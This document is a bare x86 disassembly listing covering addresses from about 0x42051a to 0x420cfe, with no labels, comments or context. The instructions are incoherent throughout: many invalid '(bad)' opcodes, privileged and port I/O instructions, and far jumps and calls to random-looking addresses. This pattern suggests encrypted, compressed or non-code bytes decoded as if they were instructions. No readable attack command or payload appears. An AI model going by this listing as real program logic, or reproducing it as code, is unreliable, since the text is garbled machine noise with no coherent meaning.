  42051a:	imul   ecx,DWORD PTR [eax+0x501181fa],0xa5c4329a
  420524:	lahf   
  420525:	cmp    BYTE PTR ds:0x79774fc5,dl
  42052b:	jp     0x42056c
  42052d:	sub    al,0x20
  42052f:	enter  0xeccd,0xdc
  420533:	jg     0x4204f3
  420535:	jb     0x420596
  420537:	dec    esi
  420538:	pop    esp
  420539:	push   ss
  42053a:	fild   WORD PTR [esi+0x7c]
  42053d:	xchg   ecx,eax
  42053e:	add    al,0x59
  420540:	xchg   BYTE PTR [edx+0x1a087869],cl
  420546:	repz loope 0x4204f9
  420549:	or     al,0x5f
  42054b:	(bad)  
  42054c:	xchg   esi,eax
  42054d:	sub    eax,0x313fd9df
  420552:	xchg   ecx,eax
  420553:	xor    DWORD PTR gs:[ecx+0x4c],0xffffffe1
  420558:	adc    al,0x4e
  42055a:	shl    DWORD PTR [edi],1
  42055c:	xchg   edx,eax
  42055d:	aaa    
  42055e:	or     ch,BYTE PTR ds:0xbfb3da16
  420564:	inc    ebx
  420565:	xchg   ebp,eax
  420566:	test   al,0x0
  420568:	lock pop ss
  42056a:	add    DWORD PTR [ebx-0x54],ebx
  42056d:	stos   DWORD PTR es:[edi],eax
  42056e:	dec    esi
  42056f:	ss dec edx
  420571:	sub    DWORD PTR [eax-0x6ffc3819],ecx
  420577:	aam    0x54
  420579:	push   ebp
  42057a:	data16 mov dl,0x9f
  42057d:	and    ecx,DWORD PTR [ecx+0x6d5b477]
  420583:	mov    esi,0x842e6755
  420588:	in     al,0x1c
  42058a:	mov    al,ds:0x3b6efe83
  42058f:	enter  0x4482,0x9a
  420593:	jge    0x42053a
  420595:	out    0xbe,al
  420597:	in     eax,dx
  420598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420599:	lock cmp edx,ecx
  42059c:	out    dx,al
  42059d:	push   ds
  42059e:	pop    ebp
  42059f:	pop    edi
  4205a0:	xchg   ebx,eax
  4205a1:	or     cl,bl
  4205a3:	hlt    
  4205a4:	mov    ?,WORD PTR [esi]
  4205a6:	pop    ecx
  4205a7:	or     ebx,DWORD PTR ds:0xc12fc6ad
  4205ad:	sub    bh,BYTE PTR [ebx-0x7618131b]
  4205b3:	cwde   
  4205b4:	and    al,0x90
  4205b6:	cmp    ebx,ebx
  4205b8:	repnz div eax
  4205bb:	sub    eax,0x86849d03
  4205c0:	dec    ecx
  4205c1:	test   DWORD PTR [ebx+ecx*4],esi
  4205c4:	xchg   esp,eax
  4205c5:	push   es
  4205c6:	popa   
  4205c7:	imul   DWORD PTR [ecx-0x3fd0796f]
  4205cd:	xchg   edi,eax
  4205ce:	xor    al,0x9a
  4205d0:	popf   
  4205d1:	in     eax,dx
  4205d2:	mov    ds:0x79072437,al
  4205d7:	or     ebp,DWORD PTR [esi+0x25]
  4205da:	test   edx,0xe8efb3c1
  4205e0:	mov    ch,BYTE PTR [eax+edx*1+0x76]
  4205e4:	in     al,dx
  4205e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205e6:	into   
  4205e7:	jecxz  0x420585
  4205e9:	and    DWORD PTR [ecx],ebx
  4205eb:	xor    al,0xdc
  4205ed:	out    dx,eax
  4205ee:	jo     0x42057a
  4205f0:	jmp    0xd32b:0x2079adc5
  4205f7:	std    
  4205f8:	das    
  4205f9:	jmp    0x12ebff5c
  4205fe:	add    bh,ah
  420600:	sub    al,BYTE PTR [ebx]
  420602:	cmp    al,0xcc
  420604:	xor    BYTE PTR [eax+0x39],cl
  420607:	out    dx,al
  420608:	jo     0x42067e
  42060a:	add    edx,edi
  42060c:	inc    ecx
  42060d:	push   esi
  42060e:	into   
  42060f:	pop    ebp
  420610:	mov    ebx,0xec506239
  420615:	int3   
  420616:	(bad)  
  420617:	not    esi
  420619:	cli    
  42061a:	mov    bl,0xd0
  42061c:	aaa    
  42061d:	inc    ebp
  42061e:	sub    ebp,DWORD PTR [esi+0x76]
  420621:	jle    0x42065b
  420623:	push   ebp
  420624:	std    
  420625:	sub    dh,BYTE PTR [ebx]
  420627:	jmp    FWORD PTR [ecx]
  420629:	add    al,dl
  42062b:	push   es
  42062c:	cmp    eax,0x3b8ce649
  420631:	cli    
  420632:	mov    eax,ds:0x72680400
  420637:	add    eax,0x66f03e6d
  42063c:	mov    ah,0x62
  42063e:	sbb    dh,BYTE PTR [eax+0x2b6a3758]
  420644:	je     0x420600
  420646:	ins    DWORD PTR es:[edi],dx
  420647:	push   edi
  420648:	mov    esp,0x4899917f
  42064d:	mov    ds:0x93beaf01,al
  420652:	in     al,0x4b
  420654:	stc    
  420655:	push   eax
  420656:	hlt    
  420657:	ss adc eax,0x36145b0c
  42065d:	cli    
  42065e:	xor    esi,DWORD PTR [ecx]
  420660:	jns    0x420601
  420662:	fild   QWORD PTR [ecx+0x33b48a40]
  420668:	ret    
  420669:	mov    dl,0x89
  42066b:	push   edx
  42066c:	sub    eax,0x7c6c21cf
  420671:	push   0x2e
  420673:	out    dx,eax
  420674:	rcr    DWORD PTR [ecx+0x12],cl
  420677:	sbb    BYTE PTR [ebx-0x230d73af],dh
  42067d:	(bad)  
  42067e:	call   0xce6d:0xb61a62a3
  420685:	lods   al,BYTE PTR ds:[esi]
  420686:	dec    eax
  420687:	stc    
  420688:	mov    ah,0xc3
  42068a:	xor    esp,DWORD PTR ds:0xb6bc64c0
  420690:	push   edi
  420691:	shl    ebp,0x1f
  420694:	add    bh,dh
  420696:	mov    bh,dh
  420698:	pop    ds
  420699:	jmp    0x5c6780c7
  42069e:	push   edx
  42069f:	pop    edi
  4206a0:	(bad)  
  4206a1:	out    0xb8,al
  4206a3:	call   0xb5b0:0x171a6c46
  4206aa:	daa    
  4206ab:	scas   al,BYTE PTR es:[edi]
  4206ac:	pushf  
  4206ad:	fs jno 0x4206c0
  4206b0:	sbb    bh,ah
  4206b2:	mov    BYTE PTR [edi+0x2],0xa5
  4206b6:	jbe    0x4206e1
  4206b8:	mov    esp,0xf05007ca
  4206bd:	sahf   
  4206be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206bf:	in     eax,0x13
  4206c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c2:	inc    ebp
  4206c3:	mov    edx,0x4a924aa0
  4206c8:	ja     0x4206f7
  4206ca:	(bad)  
  4206cc:	iret   
  4206cd:	cmp    cl,bh
  4206cf:	cmp    al,0x0
  4206d1:	inc    ebp
  4206d2:	inc    esp
  4206d3:	cs xor eax,0x89e139a2
  4206d9:	imul   ecx,DWORD PTR [edi],0x20
  4206dc:	imul   ecx,DWORD PTR [ebx],0x72
  4206df:	mov    dh,0x19
  4206e1:	push   edx
  4206e2:	loope  0x42068a
  4206e4:	inc    edi
  4206e5:	loope  0x42071b
  4206e7:	aad    0x4c
  4206e9:	call   0x8cb92bf1
  4206ee:	and    BYTE PTR [ebp-0x69],dl
  4206f1:	das    
  4206f2:	jbe    0x420696
  4206f4:	sub    ebx,ebx
  4206f6:	loop   0x420685
  4206f8:	test   DWORD PTR [eax],ebx
  4206fa:	add    BYTE PTR [ebp+0x7e5d231c],dl
  420700:	hlt    
  420701:	jnp    0x4206ee
  420703:	repz ja 0x4206dd
  420706:	inc    ebp
  420707:	shr    BYTE PTR [edi+ebp*2+0x5407508],1
  42070e:	pop    edx
  42070f:	std    
  420710:	pop    ds
  420711:	jnp    0x4206be
  420713:	xchg   edx,eax
  420714:	mov    eax,0xf8c9c8ec
  420719:	fbstp  TBYTE PTR [ecx*8-0x1ec77f81]
  420720:	fdivp  st(0),st
  420722:	sbb    edx,ebp
  420724:	adc    BYTE PTR [edi],ah
  420726:	rol    al,0x7e
  420729:	add    DWORD PTR [ebp+0x223db78c],edx
  42072f:	push   esi
  420730:	mov    bh,0xb0
  420732:	clc    
  420733:	inc    eax
  420734:	std    
  420735:	test   DWORD PTR [ebp-0x4953d211],esi
  42073b:	or     eax,0x190bc834
  420740:	push   ebp
  420742:	test   al,0x68
  420744:	push   esp
  420745:	test   BYTE PTR [eax+0x49],al
  420748:	call   0xdc212da0
  42074d:	jmp    0x65b1:0xaae1858e
  420754:	int3   
  420755:	mov    eax,ds:0xd6142c7a
  42075a:	adc    BYTE PTR [eax],bh
  42075c:	pop    esi
  42075d:	dec    eax
  42075e:	pop    eax
  42075f:	aad    0x94
  420761:	adc    ah,ch
  420763:	in     al,0x99
  420765:	arpl   WORD PTR ds:0xceaea3ca,cx
  42076b:	ret    0xc724
  42076e:	sahf   
  42076f:	stc    
  420770:	inc    ebp
  420771:	das    
  420772:	mov    al,ds:0xe19afc02
  420777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420778:	and    al,0xf0
  42077b:	inc    ebx
  42077c:	sahf   
  42077d:	xor    BYTE PTR [edx],dh
  42077f:	dec    edx
  420780:	pop    ds
  420781:	ja     0x42070f
  420783:	xlat   BYTE PTR ds:[ebx]
  420784:	(bad)
  420787:	ret    0x86ab
  42078a:	fldcw  WORD PTR [eax+0x2]
  42078d:	enter  0x3d9b,0x3f
  420791:	jne    0x420799
  420793:	push   ds
  420794:	inc    edi
  420795:	shl    DWORD PTR [eax+edi*2+0x3e],1
  420799:	xor    al,0xd0
  42079b:	in     al,dx
  42079c:	div    edx
  42079e:	fisubr DWORD PTR [edx]
  4207a0:	adc    BYTE PTR [ecx-0x72],dl
  4207a3:	and    cl,al
  4207a5:	push   0xba8098d1
  4207aa:	cwde   
  4207ab:	push   esi
  4207ac:	test   DWORD PTR [esi-0xdf18d79],esi
  4207b2:	idiv   DWORD PTR [edx]
  4207b4:	ret    0xb0eb
  4207b7:	ror    DWORD PTR [eax+0x38],1
  4207ba:	pop    ebx
  4207bb:	jecxz  0x420745
  4207bd:	inc    edi
  4207be:	xchg   ecx,eax
  4207bf:	or     ebx,ecx
  4207c1:	cwde   
  4207c2:	icebp  
  4207c3:	icebp  
  4207c4:	xlat   BYTE PTR ds:[ebx]
  4207c5:	cmp    ah,BYTE PTR [ecx-0x68217190]
  4207cb:	cdq    
  4207cc:	jge    0x420795
  4207ce:	(bad)
  4207d1:	dec    edi
  4207d2:	mov    ebx,0xd8c0dbdc
  4207d7:	push   ebx
  4207d8:	aad    0x23
  4207da:	pop    ds
  4207db:	mov    bh,0x88
  4207dd:	cmp    dl,ah
  4207df:	aas    
  4207e0:	call   0x7c5:0x9bc30400
  4207e7:	pop    ebp
  4207e8:	dec    esp
  4207e9:	mov    bl,BYTE PTR [edi+0x1ecbc3f8]
  4207ef:	lds    edx,FWORD PTR [ebx+0x5f]
  4207f2:	and    al,0xfa
  4207f4:	xor    DWORD PTR [esi-0x4db34666],esi
  4207fa:	sub    eax,0x4915fad2
  4207ff:	mov    eax,0x9edcaa63
  420804:	inc    eax
  420805:	and    ecx,DWORD PTR [esi-0x52]
  420808:	loop   0x4207b6
  42080a:	call   0x8c8a:0xeb954106
  420811:	jmp    0x87532de0
  420816:	shl    DWORD PTR [ebx+edx*1],1
  420819:	dec    esp
  42081a:	adc    DWORD PTR [ebp+0x5672227a],esi
  420820:	sbb    al,0x78
  420822:	xor    DWORD PTR [eax],esp
  420824:	sub    BYTE PTR [edi],dh
  420826:	ss daa 
  420828:	sbb    al,0x6c
  42082a:	xor    DWORD PTR [ebp-0x1b],esi
  42082d:	sbb    ah,BYTE PTR [eax]
  42082f:	xchg   edi,eax
  420830:	retf   0x4b5b
  420833:	mov    ebp,0x4c8a8363
  420838:	imul   edi,DWORD PTR [ebx-0x2784a101],0x33759861
  420842:	in     al,0x4c
  420844:	mov    BYTE PTR [edx-0x41fb668],dl
  42084a:	xchg   edi,eax
  42084b:	nop
  42084c:	loopne 0x4208a0
  42084e:	call   0x2a5a:0x7340fbac
  420855:	or     ah,BYTE PTR [ebx-0x5b2f1ed4]
  42085b:	and    ecx,DWORD PTR [ebx]
  42085d:	ret    
  42085e:	dec    ebx
  42085f:	mov    dl,0xc5
  420861:	xor    ah,ah
  420863:	ftst   
  420865:	and    al,0x96
  420867:	clts   
  420869:	add    eax,0x506b7365
  42086e:	mov    ebp,0x9f35a51c
  420873:	pusha  
  420874:	xchg   esp,eax
  420875:	loop   0x4208ec
  420877:	jne    0x420875
  420879:	inc    ebx
  42087a:	ror    DWORD PTR ds:0x30ffbc44,cl
  420880:	pop    esi
  420881:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420883:	int    0xe2
  420885:	pop    edx
  420886:	or     DWORD PTR [edi+0x7e],ebx
  420889:	mov    ch,0xc3
  42088b:	aam    0xe4
  42088d:	jmp    0x33a7:0x80748add
  420894:	jns    0x420896
  420896:	add    DWORD PTR [edx],ebx
  420898:	inc    eax
  420899:	mov    DWORD PTR [eax+0x55],edx
  42089c:	jp     0x4208ee
  42089e:	dec    ecx
  42089f:	jne    0x4208a0
  4208a1:	push   ss
  4208a2:	in     eax,0xf2
  4208a4:	adc    al,0x42
  4208a6:	adc    al,bh
  4208a8:	lock cwde 
  4208aa:	xchg   esi,eax
  4208ab:	aas    
  4208ac:	lods   eax,DWORD PTR ds:[esi]
  4208ad:	xchg   WORD PTR [ebp-0x6e981fe9],bx
  4208b4:	inc    ebx
  4208b5:	or     DWORD PTR [ebp+0x54e54898],esi
  4208bb:	sub    BYTE PTR [eax-0x1c422498],ah
  4208c1:	cmp    BYTE PTR [eax-0x26],dh
  4208c4:	loop   0x42088d
  4208c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208c7:	xchg   edi,eax
  4208c8:	add    eax,0x753a1d2a
  4208cd:	jns    0x4208a8
  4208cf:	leave  
  4208d0:	or     eax,0x908ada57
  4208d5:	outs   dx,DWORD PTR ds:[esi]
  4208d6:	add    DWORD PTR [ebp*4-0x2b63e6b7],esi
  4208dd:	jbe    0x420948
  4208df:	jecxz  0x4208ef
  4208e1:	int3   
  4208e2:	push   eax
  4208e3:	push   ss
  4208e4:	push   es
  4208e5:	test   al,0xb2
  4208e7:	or     edi,DWORD PTR [edi+0x65]
  4208ea:	pusha  
  4208eb:	(bad)  
  4208ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208ed:	push   ecx
  4208ee:	adc    DWORD PTR [eax+0x5c102911],ebx
  4208f4:	retf   0x7ef4
  4208f7:	ss jo  0x4208b9
  4208fa:	in     eax,dx
  4208fb:	dec    BYTE PTR [ebx]
  4208fd:	jns    0x420968
  4208ff:	sbb    dh,ah
  420901:	jbe    0x4208ae
  420903:	mov    ah,0x3f
  420905:	push   0xffffffaf
  420907:	and    eax,0x2f8321e6
  42090c:	push   es
  42090d:	jmp    0xbae13020
  420912:	add    al,BYTE PTR [edi+ebp*1]
  420915:	sbb    eax,0x52872e7b
  42091a:	add    al,0x69
  42091c:	fs (bad) 
  42091e:	ja     0x4208a9
  420920:	adc    eax,0xc26b3f04
  420925:	call   DWORD PTR ds:0x726805eb
  42092b:	xchg   DWORD PTR [edi+0x6],ecx
  42092e:	add    esi,DWORD PTR [esi+0x26]
  420931:	mov    edi,0xb699bbe
  420936:	out    0xf,al
  420938:	xor    BYTE PTR [esi-0x10b68ea2],ch
  42093e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42093f:	xchg   esp,eax
  420940:	rol    ah,0xdf
  420943:	jl     0x420981
  420945:	pop    es
  420946:	repnz pop es
  420948:	jbe    0x420945
  42094a:	aas    
  42094b:	or     bh,BYTE PTR [ebp+0x56776ae9]
  420951:	xlat   BYTE PTR ds:[ebx]
  420952:	cdq    
  420953:	shr    BYTE PTR [ebx],0x1
  420956:	mov    dl,BYTE PTR [esi-0x5876e8be]
  42095c:	es adc dl,dh
  42095f:	push   0xffffffbf
  420961:	stos   BYTE PTR es:[edi],al
  420962:	fcom   DWORD PTR [ebx-0xe]
  420965:	xchg   esp,eax
  420966:	into   
  420967:	stc    
  420968:	cmc    
  420969:	jnp    0x4209d5
  42096b:	push   esp
  42096c:	adc    BYTE PTR [esi-0xe],ch
  42096f:	pop    ds
  420970:	push   eax
  420971:	push   ecx
  420972:	add    bh,BYTE PTR [eax+ebp*2]
  420975:	xchg   ebp,eax
  420976:	mov    dl,0x4a
  420978:	cmp    eax,0x1feaa81d
  42097d:	sbb    DWORD PTR [eax],ebp
  42097f:	mov    edx,ebp
  420981:	adc    BYTE PTR [edx-0x6ce63244],al
  420987:	mov    ecx,edi
  420989:	rcl    eax,cl
  42098b:	push   ebp
  42098c:	mov    edx,0xe97f557e
  420991:	ficomp WORD PTR [esi+esi*4-0x3c4e89b5]
  420998:	shr    DWORD PTR [ebx+0x1b6a2cb1],cl
  42099e:	addr16 adc eax,0x50d7c531
  4209a4:	pop    ecx
  4209a5:	push   cs
  4209a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209a7:	jg     0x420a1d
  4209a9:	lahf   
  4209aa:	out    dx,al
  4209ab:	add    ah,BYTE PTR ds:0x99749e93
  4209b1:	scas   al,BYTE PTR es:[edi]
  4209b2:	sbb    eax,0xba03e092
  4209b7:	cmp    al,0xe1
  4209b9:	(bad)  
  4209bb:	ret    
  4209bc:	cmp    BYTE PTR [eax+0x20bd06b8],0x86
  4209c3:	push   ss
  4209c4:	call   0x77419407
  4209c9:	test   DWORD PTR [ebx+0x9ff11bd],eax
  4209cf:	scas   eax,DWORD PTR es:[edi]
  4209d0:	cli    
  4209d1:	mov    ch,0x2c
  4209d3:	adc    eax,0xc8b10c29
  4209d8:	loopne 0x420a44
  4209da:	outs   dx,DWORD PTR cs:[esi]
  4209dc:	sub    eax,0x752dc486
  4209e1:	xchg   edi,eax
  4209e2:	(bad)  
  4209e3:	fbstp  TBYTE PTR [edx+0x7f]
  4209e6:	lock (bad) 
  4209e8:	pop    ecx
  4209e9:	loope  0x420a57
  4209eb:	dec    ebx
  4209ec:	lods   al,BYTE PTR ds:[esi]
  4209ed:	push   eax
  4209ee:	sahf   
  4209ef:	call   0x15a4e6c4
  4209f4:	mov    esi,DWORD PTR [ebp-0x6e]
  4209f7:	pop    eax
  4209f8:	add    DWORD PTR [eax-0x17],ebp
  4209fb:	repz sub edi,DWORD PTR [esi]
  4209fe:	and    DWORD PTR [ebx],esp
  420a00:	add    ebx,ebp
  420a02:	cmp    eax,0x93a0d151
  420a07:	rcr    BYTE PTR [ecx],0x19
  420a0a:	aaa    
  420a0b:	or     edx,eax
  420a0d:	bound  ecx,QWORD PTR [ecx-0x557b4a47]
  420a13:	aam    0x64
  420a15:	xchg   edi,eax
  420a16:	stos   DWORD PTR es:[edi],eax
  420a17:	adc    BYTE PTR [edi],al
  420a19:	(bad)  
  420a1a:	xor    ebx,DWORD PTR [eax-0x39]
  420a1d:	mov    dh,0xc3
  420a1f:	fst    DWORD PTR [edi+0x76e2500b]
  420a25:	not    dh
  420a27:	cmp    al,0x59
  420a29:	pop    es
  420a2a:	call   0xbe3329c8
  420a2f:	addr16 js 0x4209c2
  420a32:	push   ebx
  420a33:	inc    BYTE PTR [edx+esi*1]
  420a36:	mov    ecx,0xcdc86910
  420a3b:	je     0x420a77
  420a3d:	pushf  
  420a3e:	mul    BYTE PTR [ebp-0x18]
  420a41:	pop    ecx
  420a42:	and    dh,BYTE PTR [edi-0x6eb0cd48]
  420a48:	sub    eax,0x34b00d9c
  420a4d:	popa   
  420a4e:	rol    BYTE PTR [ebp-0x2e],1
  420a51:	xchg   DWORD PTR [esi+0x2a0fdfae],ecx
  420a57:	push   DWORD PTR [esi+0x41]
  420a5a:	jge    0x4209ef
  420a5c:	push   ebp
  420a5d:	loopne 0x420a8e
  420a5f:	retf   
  420a60:	sbb    bh,al
  420a62:	mov    eax,ds:0x798bd0d8
  420a67:	out    dx,eax
  420a68:	dec    eax
  420a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a6a:	dec    ecx
  420a6b:	or     DWORD PTR [esi-0x31],0xffffffee
  420a6f:	shr    DWORD PTR [esp+esi*2+0x6451d121],cl
  420a76:	adc    al,0xf5
  420a78:	or     DWORD PTR [edx],0x5a1552c7
  420a7e:	or     BYTE PTR [ebp+0x5e],ch
  420a81:	push   ebx
  420a82:	lock inc esi
  420a84:	outs   dx,DWORD PTR ds:[esi]
  420a85:	pop    esp
  420a86:	inc    ecx
  420a87:	or     eax,0x79
  420a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a8b:	cmp    ch,ch
  420a8d:	jne    0x420a86
  420a8f:	shl    BYTE PTR [edi+0x3d53dbd6],cl
  420a95:	dec    ebp
  420a96:	push   ecx
  420a97:	bound  esp,QWORD PTR [edi+0x78]
  420a9a:	ja     0x420a7a
  420a9c:	pushf  
  420a9d:	and    BYTE PTR ds:0x9f559b79,ah
  420aa3:	inc    ebp
  420aa4:	add    edi,edx
  420aa6:	and    ebx,edx
  420aa8:	cmp    DWORD PTR [edi+0x7b822cd5],esi
  420aae:	xchg   cl,bh
  420ab0:	push   esi
  420ab1:	pop    ss
  420ab2:	and    dh,BYTE PTR [eax-0x5c]
  420ab5:	mov    esi,0x5b3160e3
  420aba:	push   ebx
  420abb:	mov    cl,0x10
  420abd:	sbb    al,0xd9
  420abf:	pop    ebx
  420ac0:	push   ss
  420ac1:	ins    BYTE PTR es:[edi],dx
  420ac2:	jae    0x420ab0
  420ac4:	mov    edx,0xbe52ce66
  420ac9:	and    eax,0xd7012fa1
  420ace:	mov    cl,0x78
  420ad0:	inc    DWORD PTR [ebp+esi*4-0x65]
  420ad4:	int    0x4f
  420ad6:	je     0x420ad4
  420ad8:	jae    0x420b35
  420ada:	les    esp,FWORD PTR [ebp+0x4380bb39]
  420ae0:	jns    0x420b1c
  420ae2:	pusha  
  420ae3:	mov    ecx,0x63b310df
  420ae8:	push   ebp
  420ae9:	pop    edx
  420aea:	cdq    
  420aeb:	pusha  
  420aec:	cmc    
  420aed:	lods   al,BYTE PTR ds:[esi]
  420aee:	popf   
  420aef:	outs   dx,BYTE PTR ds:[esi]
  420af0:	ret    0x744d
  420af3:	xor    al,0xae
  420af5:	push   eax
  420af6:	mov    DWORD PTR [ebp+0x1ca03ac5],eax
  420afc:	xchg   esp,eax
  420afd:	and    eax,0x2a824b88
  420b02:	pop    es
  420b03:	mov    BYTE PTR [edi+0x29],bh
  420b06:	call   0x33269460
  420b0b:	jns    0x420ad7
  420b0d:	jnp    0x420b66
  420b0f:	mov    ebx,0x4d388241
  420b14:	cli    
  420b15:	lock and BYTE PTR [edi+0xc49d24b],dh
  420b1c:	adc    DWORD PTR [ebp-0x77],edx
  420b1f:	in     al,0xd
  420b21:	or     eax,0xd4583c72
  420b26:	rep lods eax,DWORD PTR ds:[esi]
  420b28:	mov    eax,0xfeaa45d8
  420b2d:	mov    edx,0x33f7ffd
  420b32:	ror    DWORD PTR [edi-0x729cb7c7],0x6
  420b39:	push   ecx
  420b3a:	imul   esi,DWORD PTR [ecx],0xf2e89b67
  420b40:	mov    ah,0x5b
  420b42:	mov    ebx,0xcdaa6a4d
  420b47:	jnp    0x420b62
  420b49:	jns    0x420bb0
  420b4b:	push   0xffffffe5
  420b4d:	jne    0x420b26
  420b4f:	retf   
  420b50:	mov    ebx,0x9c6ab99b
  420b55:	scas   al,BYTE PTR es:[edi]
  420b56:	cdq    
  420b57:	mov    ds,edx
  420b59:	cmp    ecx,ebx
  420b5b:	imul   eax,DWORD PTR [edx-0x40],0x13
  420b5f:	add    BYTE PTR [ebx],dh
  420b61:	sbb    bh,dl
  420b63:	hlt    
  420b64:	pop    esi
  420b65:	arpl   WORD PTR [edi-0x71f94f3d],di
  420b6b:	pop    edx
  420b6c:	xchg   ebp,eax
  420b6d:	bound  ebx,QWORD PTR [ecx+0x45]
  420b70:	repnz pop eax
  420b72:	mov    ds:0x2436c749,al
  420b77:	pop    ss
  420b78:	jne    0x420baf
  420b7a:	mov    ch,0xa8
  420b7c:	stos   DWORD PTR es:[edi],eax
  420b7d:	loop   0x420bb7
  420b7f:	(bad)  
  420b80:	cmc    
  420b81:	es jmp 0x377db836
  420b87:	dec    esi
  420b88:	mov    ecx,0x8ef67863
  420b8d:	lock mov ebp,0x8e6be7c1
  420b93:	mov    esp,0xe11d7a20
  420b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b99:	cmc    
  420b9a:	mov    dl,0xc4
  420b9c:	xor    DWORD PTR [edx],ebx
  420b9e:	es cmp ecx,esp
  420ba1:	jecxz  0x420bf9
  420ba3:	dec    esp
  420ba4:	hlt    
  420ba5:	cmc    
  420ba6:	js     0x420b3a
  420ba8:	cwde   
  420ba9:	out    dx,al
  420baa:	out    dx,eax
  420bab:	(bad)  
  420bac:	xchg   ebp,eax
  420bad:	(bad)  
  420bae:	jge    0x420b4c
  420bb0:	call   0xf86c:0x1b7bf312
  420bb7:	push   0xffffffa8
  420bb9:	lock or al,0x40
  420bbc:	fwait
  420bbd:	in     eax,0xc5
  420bbf:	xchg   eax,edi
  420bc1:	cs pop es
  420bc3:	xlat   BYTE PTR ds:[ebx]
  420bc4:	retf   
  420bc5:	fistp  WORD PTR [eax+ecx*1-0x2cca6278]
  420bcc:	das    
  420bcd:	mov    edx,ebp
  420bcf:	add    DWORD PTR [ebp-0x28fc53f8],edx
  420bd5:	das    
  420bd6:	cmp    esi,DWORD PTR [esi+ecx*8]
  420bd9:	fistp  DWORD PTR [eax+0x6162672c]
  420bdf:	rol    al,0xd6
  420be2:	and    al,0x45
  420be4:	cmc    
  420be5:	jns    0x420b7d
  420be7:	lock xor BYTE PTR [eax-0x55bae2d4],al
  420bee:	pushf  
  420bef:	imul   edi,DWORD PTR [esi+ebp*8+0x36dcaa14],0x3273da1
  420bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bfb:	pop    ebp
  420bfc:	xchg   edi,eax
  420bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bfe:	pop    eax
  420bff:	test   eax,0x4fa76d90
  420c04:	retf   0x2348
  420c07:	add    DWORD PTR [ecx-0x16],ecx
  420c0a:	stos   DWORD PTR es:[edi],eax
  420c0b:	add    ebp,0x3ff297bc
  420c11:	retf   
  420c12:	(bad)  
  420c13:	jg     0x420bc2
  420c15:	mov    esi,0x3d49c1ed
  420c1a:	pop    ecx
  420c1b:	out    dx,eax
  420c1c:	pop    esp
  420c1d:	jnp    0x420c91
  420c1f:	test   al,0xd5
  420c21:	std    
  420c22:	push   ecx
  420c23:	or     edi,DWORD PTR [edx-0x4f]
  420c26:	adc    al,0x18
  420c28:	adc    al,0x85
  420c2a:	or     BYTE PTR [esi-0x20],ah
  420c2d:	enter  0xd0fe,0xbb
  420c31:	test   DWORD PTR [ebp-0x2a],ecx
  420c34:	imul   eax,edi,0xffffff94
  420c37:	lods   eax,DWORD PTR ds:[esi]
  420c38:	jne    0x420c16
  420c3a:	xor    BYTE PTR [eax],bl
  420c3c:	add    eax,0x213a33dc
  420c41:	jb     0x420bec
  420c43:	out    dx,eax
  420c44:	sbb    BYTE PTR [esi+0x63baf751],al
  420c4a:	inc    esi
  420c4b:	or     eax,0x2693f4bb
  420c50:	sub    cl,bh
  420c52:	pop    ecx
  420c53:	pop    esi
  420c54:	(bad)  
  420c55:	sbb    DWORD PTR [ebx-0x7aa5abda],ebp
  420c5b:	in     eax,dx
  420c5c:	ret    
  420c5d:	in     al,dx
  420c5e:	jp     0x420bfe
  420c60:	call   0x68bc:0xc62eff7d
  420c67:	sbb    al,0x90
  420c69:	jp     0x420c60
  420c6b:	or     DWORD PTR [esi],eax
  420c6d:	pop    esi
  420c6e:	or     al,BYTE PTR [ebx]
  420c70:	mov    dh,0x20
  420c72:	sub    al,BYTE PTR [ebx+0x16]
  420c75:	outs   dx,BYTE PTR ds:[esi]
  420c76:	mov    eax,0xacb41d66
  420c7b:	ss mov esi,0x3dd3a835
  420c81:	call   0x8d8d3e7b
  420c86:	scas   eax,DWORD PTR es:[edi]
  420c87:	getsec 
  420c89:	dec    eax
  420c8a:	cmp    al,ah
  420c8c:	sbb    bh,bl
  420c8e:	mov    ds:0xa3f8ef22,al
  420c93:	ins    BYTE PTR es:[edi],dx
  420c94:	jg     0x420d13
  420c96:	gs sahf 
  420c98:	xor    ecx,DWORD PTR [ecx+0x49]
  420c9b:	(bad)  
  420c9c:	stc    
  420c9d:	mov    WORD PTR [edx],?
  420c9f:	mov    esp,0x7e6512db
  420ca4:	mov    bl,0xa6
  420ca6:	push   ecx
  420ca7:	mov    edi,0x85073f49
  420cac:	and    esp,ebx
  420cae:	pushf  
  420caf:	xlat   BYTE PTR ds:[ebx]
  420cb0:	or     BYTE PTR [edx-0xffb61ef],0x2e
  420cb7:	nop
  420cb8:	gs xor ch,bl
  420cbb:	add    al,0xe1
  420cbd:	mov    ds:0x46818731,eax
  420cc2:	fwait
  420cc3:	xor    ecx,ebx
  420cc5:	popf   
  420cc6:	sbb    DWORD PTR [edx+0x5f],esi
  420cc9:	in     al,0x14
  420ccb:	fdiv   DWORD PTR [edi+0x5c]
  420cce:	or     eax,ebx
  420cd0:	mov    edi,0x52c90e75
  420cd5:	pop    esi
  420cd6:	(bad)  
  420cd7:	out    dx,al
  420cd8:	sbb    BYTE PTR [ebp-0x72a72702],ah
  420cde:	push   es
  420cdf:	mov    ecx,0xf2dec2e7
  420ce4:	outs   dx,DWORD PTR ds:[esi]
  420ce5:	div    DWORD PTR [esi]
  420ce7:	jne    0x420d2c
  420ce9:	and    DWORD PTR [ebx],0xffffffa8
  420cec:	sbb    ebx,DWORD PTR [esi+0x68a6e301]
  420cf2:	mov    bh,0x59
  420cf4:	fisubr DWORD PTR [eax]
  420cf6:	xor    ecx,esp
  420cf8:	pop    ebx
  420cf9:	pop    esp
  420cfa:	std    
  420cfb:	dec    ecx
  420cfc:	fisttp WORD PTR [esi]
  420cfe:	xchg   ecx,eax
